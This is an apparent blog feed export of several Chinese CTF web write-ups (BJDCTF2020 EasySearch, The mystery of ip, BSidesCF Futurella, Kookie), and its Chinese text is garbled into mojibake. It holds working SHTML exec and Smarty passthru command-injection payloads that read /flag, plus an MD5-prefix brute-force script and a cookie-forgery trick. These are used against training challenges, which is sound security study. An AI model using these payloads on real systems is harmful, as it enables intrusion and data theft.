<p>è¿™ä¹ˆä¸€çœ‹ï¼Œç»•è¿‡å½·ä½›å¾ˆç®€å•ï¼Œåªéœ€è¦getæˆ–è€…postä¼ å…¥<code>flag=abc</code>å³å¯ã€‚ä½†æ˜¯æ³¨æ„åˆ°æœ€å‰é¢çš„ä¸¤ä¸ª<code>foreach</code>ï¼Œè¿™æ‰æ˜¯æœ¬é¢˜çš„è€ƒç‚¹ã€‚å‡è®¾æˆ‘ä»¬<code>flag=abc</code>ä»¥getæ–¹å¼ä¼ å…¥ï¼Œé‚£ä¹ˆç»è¿‡ç¬¬äºŒä¸ª<code>foreach</code>ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. å› ä¸º<span class="variable">$abc</span>å¹¶ä¸å­˜åœ¨ï¼Œæ‰€ä»¥ä¸ºç©ºï¼Œå³<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. è¿™æ ·å³ä½¿ç»•è¿‡äº†ï¼Œè¾“å…¥çš„flagä¹Ÿä¸ºç©º</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
<p>postæ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·ï¼Œä¼šè¢«ç¬¬ä¸€ä¸ª<code>foreach</code>ä¿®æ”¹flagå€¼ã€‚</p>
<p>å› æ­¤ï¼Œç»•è¿‡è¿™ä¸ªæ–¹æ³•è¡Œä¸é€šã€‚æ­¤æ—¶æ³¨æ„åˆ°æœ‰ä¸‰ä¸ªåœ°æ–¹æœ‰ <code>exit</code> è¯¥å‡½æ•°è™½ç„¶ä¼šé€€å‡ºç¨‹åºï¼Œä½†æ˜¯åœ¨é€€å‡ºä¹‹å‰ä¹Ÿä¼šå°†å˜é‡æ‰“å°å‡ºæ¥ã€‚å› æ­¤ï¼Œæ¥ä¸‹æ¥çš„æ€è·¯æœ‰ä¸‰ä¸ªï¼š</p>
<ol type="1">
<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
<li><code>$yds=$flag</code></li>
<li>`<code>$is=$flag</code></li>
</ol>
<p>çœ‹æ€è·¯1ï¼Œæˆ‘ä»¬éœ€è¦getæ–¹å¼ä¼ å…¥ <code>handsome=flag&amp;flag=handsome</code>ï¼Œ<strong>æ³¨æ„é¡ºåº</strong>ã€‚æ­¤æ—¶çš„æ‰§è¡Œè¿‡ç¨‹å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>ä¸ºflag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>è·å–<span class="variable">$handsome</span>çš„å€¼ï¼Œä¹Ÿå°±æ˜¯flag</span><br><span class="line"><span class="number">3</span>. è¾“å‡º <span class="variable">$handsome</span>ï¼Œä¹Ÿå°±æ˜¯flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
<p>çœ‹æ€è·¯2ï¼Œè¿™ä¸ªæ˜¯æœ€ç®€å•çš„ï¼Œåªéœ€è¦getæ–¹å¼ä¼ å…¥ <code>yds=flag</code>ï¼Œæ­¤æ—¶ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">ç„¶åè¾“å‡º <span class="variable">$yds</span>ï¼Œå³flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
<p>çœ‹æ€è·¯3ä¹‹å‰ï¼Œæˆ‘ä»¬å¾—å…ˆæ˜ç™½ï¼Œå‚æ•°åªèƒ½é€šè¿‡ç¬¬äºŒä¸ª<code>foreach</code>æ‰è¡Œï¼Œä¹Ÿå°±æ˜¯å¿…é¡»ç”¨getæ–¹å¼ä¼ å…¥<code>is=flag</code>ï¼Œå¦‚æœæ˜¯postä¼ å…¥åˆ™ä¼šå˜æˆ<code>$is=flag</code>é‚£ä¹ˆè¾“å‡ºå°±çœŸçš„æ˜¯â€œflagâ€äº†ï¼ˆç¬‘ï¼‰ã€‚æ¥ä¸‹æ¥éœ€è¦æ»¡è¶³ç¬¬ä¸‰ä¸ªifæ‰èƒ½è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¿˜éœ€è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°flagï¼Œä¸”å€¼ä¸ºflagã€‚å¦‚æœç”¨postä¼ å…¥ï¼Œåˆ™ç»è¿‡ç¬¬ä¸€ä¸ª <code>foreach</code>ï¼Œå°±ä¼šå˜æˆ <code>$flag=flag</code>ï¼Œæ­¤æ—¶åé¢å³ä½¿ <code>$is=$flag</code>ï¼Œè¾“å‡ºçš„ä¹Ÿæ˜¯â€œflagâ€ã€‚å› æ­¤åªèƒ½é€šè¿‡getä¼ å…¥ï¼Œå› æ­¤æœ€ç»ˆçš„payloadä¸º <code>is=flag&amp;flag=flag</code>ï¼Œè¿™é‡Œé¡ºåºæ— æ‰€è°“ã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>è·å¾—flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; ä»€ä¹ˆéƒ½æ²¡æ”¹å˜</span><br><span class="line"><span class="number">3</span>. è¾“å‡º<span class="variable">$is</span>ï¼Œå³flag</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯ <strong>phpå˜é‡è¦†ç›–æ¼æ´</strong>ã€‚ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">æ­¤æ—¶çš„ç»“æœä¸ºï¼šhello world</span><br><span class="line">è§£é‡Šï¼šå› ä¸º <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>ï¼Œæ‰€ä»¥ <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>gitæ³„éœ²</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 EasySearch</title>
    <url>/2022/04/19/BJDCTF2020%20EasySearch/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">EasySearch</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œçœ‹åˆ°çš„å°±æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢ï¼ŒæŸ¥çœ‹æºç ã€æŠ“åŒ…éƒ½æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå°è¯•å¯¹ç™»é™†ç•Œé¢è¿›è¡ŒSQLæ³¨å…¥ä¹Ÿæ²¡æœ‰ç»“æœã€‚æ‰€ä»¥æ‰“ç®—è¿›è¡Œè·¯å¾„æ‰«æï¼Œç»“æœå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">200 index.php </span><br><span class="line">200 index.php/login</span><br><span class="line">403 /public/  </span><br><span class="line">403 /server-status</span><br><span class="line">403 /server-status/</span><br><span class="line">403 /cgi-bin/</span><br></pre></td></tr></table></figure></p>
<p>æœ€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯403 Bypassï¼Œä½†æ˜¯ç»è¿‡å°è¯•ï¼Œå‘ç°è¡Œä¸é€šã€‚æœ€åå®åœ¨æ²¡åŠæ³•å»æŸ¥çœ‹äº†ä¸€ä¸‹åˆ«äººçš„WPï¼Œå‘ç°åŸæ¥çš„é¢˜ç›®æ˜¯æœ‰æç¤ºçš„ï¼Œå°±æ˜¯<strong>è®¿é—®<code>index.php.swp</code></strong>ã€‚è®¿é—®è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°å¦‚ä¸‹æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];  <span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
<p>é€šè¿‡ä»£ç å®¡è®¡ï¼Œå‘ç°èƒ½å¤Ÿåˆ©ç”¨çš„å°±æ˜¯<code>fwrite($shtml,$text);</code>ï¼Œå°†æˆ‘ä»¬è¾“å…¥çš„usernameå†™å…¥æ–‡ä»¶ã€‚é€šè¿‡æœç´¢å‘ç°shtmlæ–‡ä»¶å¯ä»¥æ‰§è¡Œbashå‘½ä»¤ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š<code>&lt;!--#exec cmd='[å‘½ä»¤]'--&gt;</code>ã€‚åªéœ€è¦è®¿é—®å¸¦æœ‰å¯¹åº”æ ¼å¼çš„shtmlæ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚</p>
<p>çŸ¥é“äº†å¦‚ä½•åˆ©ç”¨ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦æ„é€ payloadï¼Œä¹Ÿå°±æ˜¯éœ€è¦çŸ¥é“usernameå’Œpasswordçš„å€¼ã€‚</p>
<p>å› ä¸º<code>fwrite($shtml,$text);</code>ä»¥åŠtextçš„å†…å®¹ï¼Œå¾—çŸ¥usernameçš„å€¼å°±æ˜¯æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„bashå‘½ä»¤ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">         $text = &#x27;</span><br><span class="line">         ***</span><br><span class="line">         ***</span><br><span class="line">         &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">         ***</span><br><span class="line">***&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>æ¥ç€ç¡®å®špasswordçš„å€¼ã€‚é€šè¿‡<code>if ( $admin == substr(md5($_POST['password']),0,6))</code>äº†è§£åˆ°ï¼Œè¾“å…¥çš„passwordç»è¿‡md5åŠ å¯†åå–å…¶å‰6ä½å­—ç¬¦æ„æˆçš„å­ä¸²ï¼Œè¯¥å­ä¸²å¿…é¡»ä¸$adminç›¸ç­‰ï¼Œä¹Ÿå°±æ˜¯å‰6ä¸ªå­—ç¬¦å¿…é¡»ä¸º<code>6d0bc1</code>ã€‚ç›´æ¥ç¼–å†™å¦‚ä¸‹è„šæœ¬ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start!&quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():   <span class="comment"># ä»0å¼€å§‹ä¸€ç›´ç´¯åŠ </span></span><br><span class="line">    h = md5(<span class="built_in">str</span>(i).encode()).hexdigest()  <span class="comment"># MD5åŠ å¯†</span></span><br><span class="line">    <span class="keyword">if</span> h[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find it! the password is: &quot;</span> + <span class="built_in">str</span>(i))  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>æœ€ç»ˆæ‰¾åˆ°password=2020666ã€‚å› æ­¤ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;find / -name flag*&#x27;--&gt;&amp;password=2020666 -&gt; æ‰¾flagæ–‡ä»¶</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114737.png" /></p>
<p>è®¿é—®shtmlæ–‡ä»¶ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114915.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&#x27;--&gt;&amp;password=2020666 -&gt; get flag</span><br></pre></td></tr></table></figure>
<p>åŒæ ·çš„ï¼Œè®¿é—®å¯¹åº”çš„shtmlæ–‡ä»¶ï¼Œå¾—åˆ°flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115013.png" /></p>
<h1 id="å‚è€ƒ">3. å‚è€ƒ</h1>
<ul>
<li><a href="https://www.cnblogs.com/Areas/p/5096899.html">SHTML æ•™ç¨‹ - Areas - åšå®¢å›­</a></li>
<li><a href="https://imagin.vip/?p=166">BJDCTF Web Write Up â€“ Imagin's Blog</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>MD5ç¢°æ’</tag>
        <tag>shtmlå‘½ä»¤æ‰§è¡Œ</tag>
        <tag>vimæ³„éœ²</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 The mystery of ip</title>
    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼šhttps://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒåå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ã€‚ç‚¹å‡» <code>flag</code> å’Œ <code>hint</code> éƒ½æ²¡æœ‰ã€‚æŠ“åŒ…ä¹Ÿæ²¡æ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Œå› æ­¤æƒ³åˆ°æ‰«æç›®å½•å§ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
<p>å‘ç°æœ‰ <code>.DS_Store</code>ï¼Œå› æ­¤å¯èƒ½æœ‰ä¿¡æ¯æ³„éœ²ï¼Œä½†æ˜¯ä¸‹è½½ä¸‹æ¥å‘ç°ï¼Œä¸€å †ä¹±ç ã€‚æ­¤æ—¶æ³¨æ„åˆ°é¢˜ç›®ï¼š<code>The_mystery_of_ip</code>ï¼Œå¹¶ä¸” <code>hint.php</code> æºç ä¸­æç¤ºåˆ° <code>&lt;!-- Do you know why i know your ip? --&gt;</code>ï¼Œå¿½ç„¶æƒ³åˆ° <code>XFF</code>ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>è¿›å…¥ <code>flag.php</code> ç„¶åæŠ“åŒ…ï¼Œä¿®æ”¹ <code>XFF</code>ã€‚ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
<p>è¯´æ˜æ­¤é¢˜çš„çªç ´ç‚¹å°±åœ¨è¿™é‡Œï¼Œä½†æ˜¯å®åœ¨æƒ³ä¸åˆ°ï¼Œçœ‹äº†åˆ«äººçš„ writeup æ‰çŸ¥é“è¿™é‡Œè€ƒçš„æ˜¯æ¨¡æ¿æ³¨å…¥ã€‚</p>
<p>å…ˆå°è¯• <code>&#123;&#123;2*3&#125;&#125;</code>ï¼Œç»“æœå¦‚ä¸‹ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
<p>å‘ç°ç¡®å®å¦‚æ­¤ï¼Œè¾“å…¥ <code>&#123;&#123;php&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
<p>å‘ç°æ˜¯ <code>smarty</code>ã€‚</p>
<p><code>smarty</code> å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec â€” æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº  </span><br><span class="line">passthru â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶ä¸”æ˜¾ç¤ºåŸå§‹è¾“å‡º  </span><br><span class="line">proc_close â€” å…³é—­ç”± proc_open æ‰“å¼€çš„è¿›ç¨‹å¹¶ä¸”è¿”å›è¿›ç¨‹é€€å‡ºç   </span><br><span class="line">proc_open â€” æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”æ‰“å¼€ç”¨æ¥è¾“å…¥/è¾“å‡ºçš„æ–‡ä»¶æŒ‡é’ˆã€‚  </span><br><span class="line">popen â€” æ‰“å¼€ä¸€ä¸ªæŒ‡å‘è¿›ç¨‹çš„ç®¡é“ï¼Œè¯¥è¿›ç¨‹ç”±æ´¾ç”Ÿç»™å®šçš„ command å‘½ä»¤æ‰§è¡Œè€Œäº§ç”Ÿã€‚  </span><br><span class="line">proc_terminate â€” æ€é™¤ç”± proc_open æ‰“å¼€çš„è¿›ç¨‹  </span><br><span class="line">shell_exec â€” é€šè¿‡ shell ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚  </span><br><span class="line">system â€” æ‰§è¡Œå¤–éƒ¨ç¨‹åºï¼Œå¹¶ä¸”æ˜¾ç¤ºè¾“å‡º  </span><br><span class="line">scandir åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸­çš„æ–‡ä»¶å’Œç›®å½•  </span><br><span class="line"><span class="keyword">eval</span> â€” æŠŠå­—ç¬¦ä¸²ä½œä¸ºPHPä»£ç æ‰§è¡Œ  </span><br><span class="line">assert --å‡½æ•°ç›´æ¥å°†ä¼ å…¥çš„å‚æ•°å½“æˆPHPä»£ç æ‰§è¡Œ</span><br></pre></td></tr></table></figure></p>
<p>è¾“å…¥ payloadï¼š<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
<p>å‘ç° flagï¼Œåˆ©ç”¨ <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
<p>æˆåŠŸgetã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<ul>
<li>æ¨¡æ¿æ³¨å…¥æ˜¯ CTF ä¸­å¸¸è€ƒçš„é¢˜ç›®ï¼Œè¿™é‡Œç€å®æ²¡æƒ³åˆ°ã€‚</li>
<li>è¦æ³¨æ„é¢˜ç›®ç¯å¢ƒä¸­çš„å„ç§ä¿¡æ¯ï¼Œæ¯”å¦‚è¿™é¢˜ä¸­çš„é¢˜ç›®æƒ³åˆ° <code>XFF</code>ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2019 Futurella</title>
    <url>/2022/04/19/BSidesCF%202019%20Futurella/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">Futurella</a></p>
<p>è¿™é¢˜ç›®å°±å¾ˆç®€å•...</p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115556.png" /></p>
<p>è®²è‹±è¯­ç¿»è¯‘è¿‡æ¥çš„æ„æ€å°±æ˜¯ï¼š<strong>é˜»æ­¢å¤–æ˜Ÿäººï¼æˆ‘ä»¬åœ¨åƒåœ¾ç®±é‡Œæ‰¾åˆ°è¿™å¼ çº¸æ¡ï¼Œæˆ‘ä»¬è®¤ä¸ºè¿™æ˜¯å¤–æ˜Ÿäººçš„ä¸œè¥¿ï¼ä½ èƒ½å¤Ÿç†è§£å®ƒå—ï¼Ÿ</strong></p>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
<h2 id="æ–¹æ³•1">2.1. æ–¹æ³•1</h2>
<p>æˆ‘æŒ‰ç…§æƒ¯ä¾‹æŸ¥çœ‹äº†ä¸€ä¸‹æºç ï¼Œç»“æœå°±å‘ç°äº†flagï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115805.png" /></p>
<p>æœ€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯å‡çš„ï¼Œæ²¡æƒ³åˆ°æ˜¯çœŸçš„ï¼</p>
<h2 id="æ–¹æ³•2">2.2. æ–¹æ³•2</h2>
<p>å‘ç°è¿™äº›ç‰¹æ®Šçš„å­—ç¬¦å¯ä»¥è¢«é€‰ä¸­ï¼Œå› æ­¤å°†å®ƒä»¬å¤åˆ¶ç²˜è´´ï¼Œä¹Ÿå¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Resistance is futile! Bring back Futurella or we&#x27;ll invade!</span><br><span class="line"></span><br><span class="line">Also, the flag is flag&#123;c1e7c9de-8b5b-4a0a-a406-596f5663a4c1&#125;</span><br></pre></td></tr></table></figure></p>
<p>è¿™å…¶å®å°±æ˜¯æºç ä¸­çš„å†…å®¹ã€‚</p>
<h1 id="ç•ªå¤–">3. ç•ªå¤–</h1>
<p>å¯¹æ¯”å¤–æ˜Ÿæ–‡å’ŒåŸæ¥çš„å†…å®¹ï¼Œä»å€’æ•°ç¬¬ä¸‰è¡Œå’Œæœ€åä¸€è¡Œçš„<code>&#123;</code>, <code>&#125;</code>æ¯”è¾ƒå®¹æ˜“çœ‹å‡ºæ¥è¿™æ˜¯flagçš„å‰åèŠ±æ‹¬å·ï¼Œå› æ­¤çŒœæµ‹ï¼Œæ¯ä¸€ä¸ªå¤–æ˜Ÿå­—ç¬¦å¯¹åº”ä¸€ä¸ªè‹±æ–‡å­—ç¬¦ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>åŸºç¡€çŸ¥è¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2019 Kookie</title>
    <url>/2022/04/20/BSidesCF%202019%20Kookie/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BBSidesCF%202019%5DKookie">Kookie</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100044.png" /></p>
<p>ä¸»é¡µé¢æ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼Œå¹¶ä¸”ç»™äº†ä¸€ä¸ªè´¦æˆ·cookie/monsterã€‚è¦æ±‚è®©æˆ‘ä»¬ç”¨adminç™»å½•ã€‚</p>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
<p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œæœ¬é¢˜å¯èƒ½è·Ÿcookieæœ‰å…³ï¼Œå› æ­¤å…ˆå°è¯•ç”¨ç»™çš„è´¦æˆ·ç™»å½•</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100151.png" /></p>
<p>åˆ·æ–°å¹¶æŠ“å–æ•°æ®åŒ…</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100235.png" /></p>
<p>å¯ä»¥çœ‹åˆ°cookieè¢«è®¾ç½®ä¸ºusername=cookieï¼Œè€Œæˆ‘ä»¬ç™»å½•çš„è´¦å·ä¹Ÿæ˜¯cookieã€‚å› æ­¤ï¼Œæœ‰ç†ç”±çŒœæµ‹å¦‚æœæˆ‘ä»¬å°†cookieè®¾ç½®ä¸ºusername=adminï¼Œå°±å¯ä»¥ä¼ªè£…adminè¿›è¡Œç™»å½•ã€‚ç»è¿‡éªŒè¯ï¼Œç¡®å®å¦‚æ­¤ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100422.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>åŸºç¡€çŸ¥è¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2020 Had a bad day</title>
    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
